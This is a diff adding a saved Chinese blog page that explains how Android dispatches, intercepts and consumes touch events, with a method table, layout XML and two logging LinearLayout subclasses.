@@ -1,0 +1,6197 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Android 编程下 Touch 事件的分发和消费机制 - sunzn - 博客园</title>
+<link type="text/css" rel="stylesheet" href="/bundles/blog-common.css?v=03KQeESEmpLfzDqUo0NiWUg5Zd5aRam3JHBZTK05Wug1"/>
+<link id="MainCss" type="text/css" rel="stylesheet" href="/skins/iMetro_HD/bundle-iMetro_HD.css?v=LB0Nt-WUQuLcxcyW_sZ5y1ZtDWL9LKn4F39H-3pjDYs1"/>
+<link id="mobile-style" media="only screen and (max-width: 768px)" type="text/css" rel="stylesheet" href="/skins/iMetro_HD/bundle-iMetro_HD-mobile.css?v=cdVbXypJFbOBYk-XwLQMriHzt9d8F_IqwzKbRKuw5AU1"/>
+<link title="RSS" type="application/rss+xml" rel="alternate" href="http://www.cnblogs.com/sunzn/rss"/>
+<link title="RSD" type="application/rsd+xml" rel="EditURI" href="http://www.cnblogs.com/sunzn/rsd.xml"/>
+<link type="application/wlwmanifest+xml" rel="wlwmanifest" href="http://www.cnblogs.com/sunzn/wlwmanifest.xml"/>
+<script src="//common.cnblogs.com/script/jquery.js" type="text/javascript"></script>  
+<script type="text/javascript">var currentBlogApp = 'sunzn', cb_enable_mathjax=false;var isLogined=false;</script>
+<script src="/bundles/blog-common.js?v=11dr0XLzw5fQ8P-Fi17Yt8Tr3N0shWFDPkWawLnvEts1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+
+<!--done-->
+<div id="home">
+<div id="header">
+	<div id="blogTitle">
+	<a id="lnkBlogLogo" href="http://www.cnblogs.com/sunzn/"><img id="blogLogo" src="/Skins/custom/images/logo.gif" alt="返回主页" /></a>			
+		
+<!--done-->
+<h1><a id="Header1_HeaderTitle" class="headermaintitle" href="http://www.cnblogs.com/sunzn/">sunzn'Blog</a></h1>
+<h2>专注于安卓应用开发</h2>
+
+
+
+		
+	</div><!--end: blogTitle 博客的标题和副标题 -->
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="http://www.cnblogs.com/">博客园</a></li>
+<li><a id="blog_nav_myhome" class="menu" href="http://www.cnblogs.com/sunzn/">首页</a></li>
+<li><a id="blog_nav_newpost" class="menu" rel="nofollow" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">新随笔</a></li>
+<li><a id="blog_nav_contact" class="menu" rel="nofollow" href="https://msg.cnblogs.com/send/sunzn">联系</a></li>
+<li><a id="blog_nav_rss" class="menu" href="http://www.cnblogs.com/sunzn/rss">订阅</a>
+<!--<a id="blog_nav_rss_image" class="aHeaderXML" href="http://www.cnblogs.com/sunzn/rss"><img src="//www.cnblogs.com/images/xml.gif" alt="订阅" /></a>--></li>
+<li><a id="blog_nav_admin" class="menu" rel="nofollow" href="https://i.cnblogs.com/">管理</a></li>
+</ul>
+		<div class="blogStats">
+			
+			<div id="blog_stats">
+<span id="stats_post_count">随笔 - 104&nbsp; </span>
+<span id="stats_article_count">文章 - 0&nbsp; </span>
+<span id="stats-comment_count">评论 - 138</span>
+</div>
+			
+		</div><!--end: blogStats -->
+	</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+	<div class = "post">
+		<h1 class = "postTitle">
+			<a id="cb_post_title_url" class="postTitle2" href="http://www.cnblogs.com/sunzn/archive/2013/05/10/3064129.html">Android 编程下 Touch 事件的分发和消费机制</a>
+		</h1>
+		<div class="clear"></div>
+		<div class="postBody">
+			<div id="cnblogs_post_body"><p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Android 中与 Touch 事件相关的方法包括：<span style="font-size: 13px; font-family: arial,helvetica,sans-serif;">dispatchTouchEvent(MotionEvent ev)</span>、<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onInterceptTouchEvent(MotionEvent ev)</span>、<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onTouchEvent(MotionEvent ev)；能够响应这些方法的控件包括：<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">ViewGroup 及其子类</span>、<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Activity</span>。方法与控件的对应关系如下表所示：</span><br /></span></p>
+<table style="border: 0px solid #000000; width: 699px; height: 140px; background-color: #e4e5e6;" border="0">
+<tbody>
+<tr>
+<td style="text-align: center;"><strong><span style="font-size: 13px; font-family: arial,helvetica,sans-serif;">Touch 事件相关方法</span></strong></td>
+<td><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp; 方法功能&nbsp; <br /></span></strong></td>
+<td style="text-align: center;"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp; ViewGroup &nbsp; <br /></span></strong></td>
+<td><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;&nbsp; &nbsp; Activity &nbsp; &nbsp; <br /></span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td><span style="font-size: 13px; font-family: arial,helvetica,sans-serif;">&nbsp; public boolean dispatchTouchEvent(MotionEvent ev)</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">事件分发 <br /></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;Yes</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;Yes</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp; public boolean onInterceptTouchEvent(MotionEvent ev)&nbsp; <br /></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">事件拦截 <br /></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;Yes</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;No</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp; public boolean onTouchEvent(MotionEvent ev)</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">事件响应 <br /></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;Yes</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;Yes</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tbody>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</table>
+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">从这张表中我们可以看到 ViewGroup 及其子类对与 Touch 事件相关的三个方法均能响应，而 Activity 对 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onInterceptTouchEvent(MotionEvent ev)</span></span> 也就是事件拦截不进行响应。<span style="color: #800000;">另外需要注意的是 View 对 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif;">dispatchTouchEvent(MotionEvent ev)</span></span> 和 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onInterceptTouchEvent(MotionEvent ev)</span></span> 的响应的前提是可以向该 View 中添加子 View，如果当前的 View 已经是一个最小的单元 View（比如 TextView），那么就无法向这个最小 View 中添加子 View，也就无法向子 View 进行事件的分发和拦截，所以它没有 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif;">dispatchTouchEvent(MotionEvent ev)</span></span> 和 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onInterceptTouchEvent(MotionEvent ev)</span></span>，只有 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onTouchEvent(MotionEvent ev)</span></span>。</span></span></p>
+<p><span style="font-size: 15px; background-color: #ffffff;"><strong><span style="font-family: arial,helvetica,sans-serif;">一、<span style="font-family: arial,helvetica,sans-serif;">Touch 事件分析</span></span></strong></span></p>
+<p><strong><span style="font-size: 14px; font-family: arial,helvetica,sans-serif;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="color: #99cc00;">▐ </span></span><span style="font-size: 13px; color: #800000;">事件分发：public boolean dispatchTouchEvent(MotionEvent ev)</span></span></strong></p>
+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Touch 事件发生时 </span><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Activity 的&nbsp;dispatchTouchEvent(MotionEvent ev) 方法会以<span style="color: #ff6600;">隧道方式<span style="color: #993366;">（从根元素依次往下传递直到最内层子元素或在中间某一元素中由于某一条件停止传递）</span></span>将事件传递给最外层 View 的 dispatchTouchEvent(MotionEvent ev) 方法，并由该 View 的 dispatchTouchEvent(MotionEvent ev) 方法对事件进行分发。<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">dispatchTouchEvent</span> 的事件分发逻辑如下：</span></p>
+<ul>
+<li><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">如果 <span style="color: #993366;"><strong>return true</strong></span>，事件会分发给当前 View 并由 dispatchTouchEvent 方法进行消费，同时事件会停止向下传递；</span></li>
+<li><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">如果 <strong><span style="color: #993366;">return false</span></strong>，事件分发分为两种情况：</span></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</ul>
+<ol>
+<li style="margin-left: 30px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">如果当前 View 获取的事件直接来自 Activity，则会将事件返回给 Activity 的 onTouchEvent 进行消费；</span></li>
+<li style="margin-left: 30px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">如果当前 View 获取的事件来自外层父控件，则会将事件返回给父 View 的&nbsp; onTouchEvent 进行消费。</span></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</ol>
+<ul>
+<li><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">如果返回系统默认的 <strong><span style="color: #993366;">super</span></strong>.dispatchTouchEvent(ev)，事件会自动的分发给当前 View 的 onInterceptTouchEvent 方法。</span></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</ul>
+<p><strong><span style="font-size: 14px; font-family: arial,helvetica,sans-serif;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="color: #99cc00;">▐ </span></span><span style="font-size: 13px; color: #800000;">事件拦截：<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">public boolean onInterceptTouchEvent(MotionEvent ev) <br /></span></span></span></strong></p>
+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">在<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">外层 View 的 dispatchTouchEvent(MotionEvent ev) 方法<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">返回系统默认的 super.dispatchTouchEvent(ev) 情况下，事件会自动的分发给当前 View 的 onInterceptTouchEvent 方法。<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onInterceptTouchEvent </span></span></span>的事件拦截逻辑如下：</span></span></span></span></p>
+<ul>
+<li><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">如果 onInterceptTouchEvent 返回 <strong><span style="color: #993366;">true</span></strong>，则表示将事件进行拦截，并将拦截到的事件交由当前 View 的 onTouchEvent 进行处理；</span></span></span></span></li>
+<li><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">如果 onInterceptTouchEvent 返回 <strong><span style="color: #993366;">false</span></strong>，则表示将事件放行，当前 View 上的事件会被传递到子 View 上，再由子 View 的 dispatchTouchEvent 来开始这个事件的分发；</span></span></span></span></li>
+<li><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">如果 onInterceptTouchEvent 返回&nbsp;<span style="color: #993366;"><strong>super</strong></span>.onInterceptTouchEvent(ev)，事件默认会被拦截，<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">并将拦截到的事件交由当前 View 的 onTouchEvent 进行处理。</span></span></span></span><br /></span></span></span></span></span></span></span></span></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</ul>
+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><strong><span style="font-size: 14px; font-family: arial,helvetica,sans-serif;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="color: #99cc00;">▐ </span></span><span style="font-size: 13px; color: #800000;">事件响应：<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">public boolean onTouchEvent(MotionEvent ev)</span></span></span></strong></span></span></span></span></span></span></span></span></span></span></span></span></p>
+<p><span style="font-size: 13px; color: #000000; font-family: arial,helvetica,sans-serif;">在 dispatchTouchEvent 返回 super.dispatchTouchEvent(ev) 并且 onInterceptTouchEvent 返回 true 或返回 super.onInterceptTouchEvent(ev) 的情况下 onTouchEvent 会被调用。<span style="font-size: 13px; color: #000000; font-family: arial,helvetica,sans-serif;">onTouchEvent </span>的事件响应逻辑如下：</span></p>
+<ul>
+<li><span style="font-size: 13px; color: #000000; font-family: arial,helvetica,sans-serif;">如果事件传递到当前 View 的 onTouchEvent 方法，而该方法返回了 false，那么这个事件会从当前 View 向上传递，并且都是由上层 View 的 onTouchEvent 来接收，如果传递到上面的 onTouchEvent 也返回 false，这个事件就会&ldquo;消失&rdquo;，而且接收不到下一次事件。</span></li>
+<li><span style="font-size: 13px; color: #000000; font-family: arial,helvetica,sans-serif;">如果返回了 true 则会接收并消费该事件。</span></li>
+<li><span style="font-size: 13px; color: #000000; font-family: arial,helvetica,sans-serif;">如果返回 super.onTouchEvent(ev) 默认处理事件的逻辑和返回 false 时相同。</span></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</ul>
+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">到这里，与 Touch 事件相关的三个方法就分析完毕了。下面的内容会通过各种不同的的测试案例来验证上文中三个方法对事件的处理逻辑。</span></p>
+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-size: 15px;"><strong><span style="font-family: arial,helvetica,sans-serif;">二、<span style="font-family: arial,helvetica,sans-serif;">Touch 案例介绍</span></span></strong></span></span></p>
+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif;"><span style="font-family: arial,helvetica,sans-serif;">同样在开始进行案例分析之前，我需要说明测试案例的结构，因为所有的测试都是针对这一个案例来进行的，测试中只是通过修改每个控件中与 Touch 事件相关的三个方法的返回值来体现不同的情况。先来看张图：</span></span></span></p>
+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif;"><span style="font-family: arial,helvetica,sans-serif;"><img title="Touch 事件案例布局 UI" src="http://images.cnitblog.com/blog/491657/201305/09143028-0ead872fd50e40f09ccc40dffb6e8d0e.png" alt="Touch 事件案例布局 UI" width="600" /></span></span></span></p>
+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">上面的图为测试案例的布局文件 UI 显示效果，布局文件代码如下：</span></p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">&lt;?</span><span style="color: #ff00ff;">xml version="1.0" encoding="utf-8"</span><span style="color: #0000ff;">?&gt;</span>
+<span style="color: #0000ff;">&lt;</span><span style="color: #800000;">cn.sunzn.tevent.TouchEventFather </span><span style="color: #ff0000;">xmlns:android</span><span style="color: #0000ff;">="http://schemas.android.com/apk/res/android"</span><span style="color: #ff0000;">
+    android:layout_width</span><span style="color: #0000ff;">="fill_parent"</span><span style="color: #ff0000;">
+    android:layout_height</span><span style="color: #0000ff;">="fill_parent"</span><span style="color: #ff0000;">
+    android:background</span><span style="color: #0000ff;">="#468AD7"</span><span style="color: #ff0000;">
+    android:gravity</span><span style="color: #0000ff;">="center"</span><span style="color: #ff0000;">
+    android:orientation</span><span style="color: #0000ff;">="vertical"</span> <span style="color: #0000ff;">&gt;</span>
+
+    <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">cn.sunzn.tevent.TouchEventChilds
+        </span><span style="color: #ff0000;">android:id</span><span style="color: #0000ff;">="@+id/childs"</span><span style="color: #ff0000;">
+        android:layout_width</span><span style="color: #0000ff;">="200dp"</span><span style="color: #ff0000;">
+        android:layout_height</span><span style="color: #0000ff;">="200dp"</span><span style="color: #ff0000;">
+        android:layout_gravity</span><span style="color: #0000ff;">="center"</span><span style="color: #ff0000;">
+        android:background</span><span style="color: #0000ff;">="#E1110D"</span><span style="color: #ff0000;">
+        android:text</span><span style="color: #0000ff;">="@string/hello"</span> <span style="color: #0000ff;">/&gt;</span>
+
+<span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">cn.sunzn.tevent.TouchEventFather</span><span style="color: #0000ff;">&gt;</span></pre>
+</div>
+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">蓝色背景为一个自定义控件 TouchEventFather，该控件为外层 View，继承自 LinearLayout，实现代码如下：</span></p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">package</span><span style="color: #000000;"> cn.sunzn.tevent;
+
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.content.Context;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.util.AttributeSet;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.util.Log;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.view.MotionEvent;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.widget.LinearLayout;
+
+</span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">class</span> TouchEventFather <span style="color: #0000ff;">extends</span><span style="color: #000000;"> LinearLayout {
+
+    </span><span style="color: #0000ff;">public</span><span style="color: #000000;"> TouchEventFather(Context context) {
+        </span><span style="color: #0000ff;">super</span><span style="color: #000000;">(context);
+    }
+
+    </span><span style="color: #0000ff;">public</span><span style="color: #000000;"> TouchEventFather(Context context, AttributeSet attrs) {
+        </span><span style="color: #0000ff;">super</span><span style="color: #000000;">(context, attrs);
+    }
+
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">boolean</span><span style="color: #000000;"> dispatchTouchEvent(MotionEvent ev) {
+        Log.e(</span>"sunzn", "TouchEventFather | dispatchTouchEvent --&gt; " +<span style="color: #000000;"> TouchEventUtil.getTouchAction(ev.getAction()));
+        </span><span style="color: #0000ff;">return</span> <span style="color: #0000ff;">super</span><span style="color: #000000;">.dispatchTouchEvent(ev);
+    }
+
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">boolean</span><span style="color: #000000;"> onInterceptTouchEvent(MotionEvent ev) {
+        Log.i(</span>"sunzn", "TouchEventFather | onInterceptTouchEvent --&gt; " +<span style="color: #000000;"> TouchEventUtil.getTouchAction(ev.getAction()));
+        </span><span style="color: #0000ff;">return</span> <span style="color: #0000ff;">super</span><span style="color: #000000;">.onInterceptTouchEvent(ev);
+    }
+
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">boolean</span><span style="color: #000000;"> onTouchEvent(MotionEvent ev) {
+        Log.d(</span>"sunzn", "TouchEventFather | onTouchEvent --&gt; " +<span style="color: #000000;"> TouchEventUtil.getTouchAction(ev.getAction()));
+        </span><span style="color: #0000ff;">return</span> <span style="color: #0000ff;">super</span><span style="color: #000000;">.onTouchEvent(ev);
+    }
+
+}</span></pre>
+</div>
+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">红色背景为一个自定义控件 TouchEventChilds，该控件为内层 View，为 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventFather</span> 的子 View，同样继承自 LinearLayout，实现代码如下：</span></p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">package</span><span style="color: #000000;"> cn.sunzn.tevent;
+
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.content.Context;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.util.AttributeSet;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.util.Log;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.view.MotionEvent;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.widget.LinearLayout;
+
+</span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">class</span> TouchEventChilds <span style="color: #0000ff;">extends</span><span style="color: #000000;"> LinearLayout {
+
+    </span><span style="color: #0000ff;">public</span><span style="color: #000000;"> TouchEventChilds(Context context) {
+        </span><span style="color: #0000ff;">super</span><span style="color: #000000;">(context);
+    }
+
+    </span><span style="color: #0000ff;">public</span><span style="color: #000000;"> TouchEventChilds(Context context, AttributeSet attrs) {
+        </span><span style="color: #0000ff;">super</span><span style="color: #000000;">(context, attrs);
+    }
+
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">boolean</span><span style="color: #000000;"> dispatchTouchEvent(MotionEvent ev) {
+        Log.e(</span>"sunzn", "TouchEventChilds | dispatchTouchEvent --&gt; " +<span style="color: #000000;"> TouchEventUtil.getTouchAction(ev.getAction()));
+        </span><span style="color: #0000ff;">return</span> <span style="color: #0000ff;">super</span><span style="color: #000000;">.dispatchTouchEvent(ev);
+    }
+
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">boolean</span><span style="color: #000000;"> onInterceptTouchEvent(MotionEvent ev) {
+        Log.i(</span>"sunzn", "TouchEventChilds | onInterceptTouchEvent --&gt; " +<span style="color: #000000;"> TouchEventUtil.getTouchAction(ev.getAction()));
+        </span><span style="color: #0000ff;">return</span> <span style="color: #0000ff;">super</span><span style="color: #000000;">.onInterceptTouchEvent(ev);
+    }
+
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">boolean</span><span style="color: #000000;"> onTouchEvent(MotionEvent ev) {
+        Log.d(</span>"sunzn", "TouchEventChilds | onTouchEvent --&gt; " +<span style="color: #000000;"> TouchEventUtil.getTouchAction(ev.getAction()));
+        </span><span style="color: #0000ff;">return</span> <span style="color: #0000ff;">super</span><span style="color: #000000;">.onTouchEvent(ev);
+    }
+
+}</span></pre>
+</div>
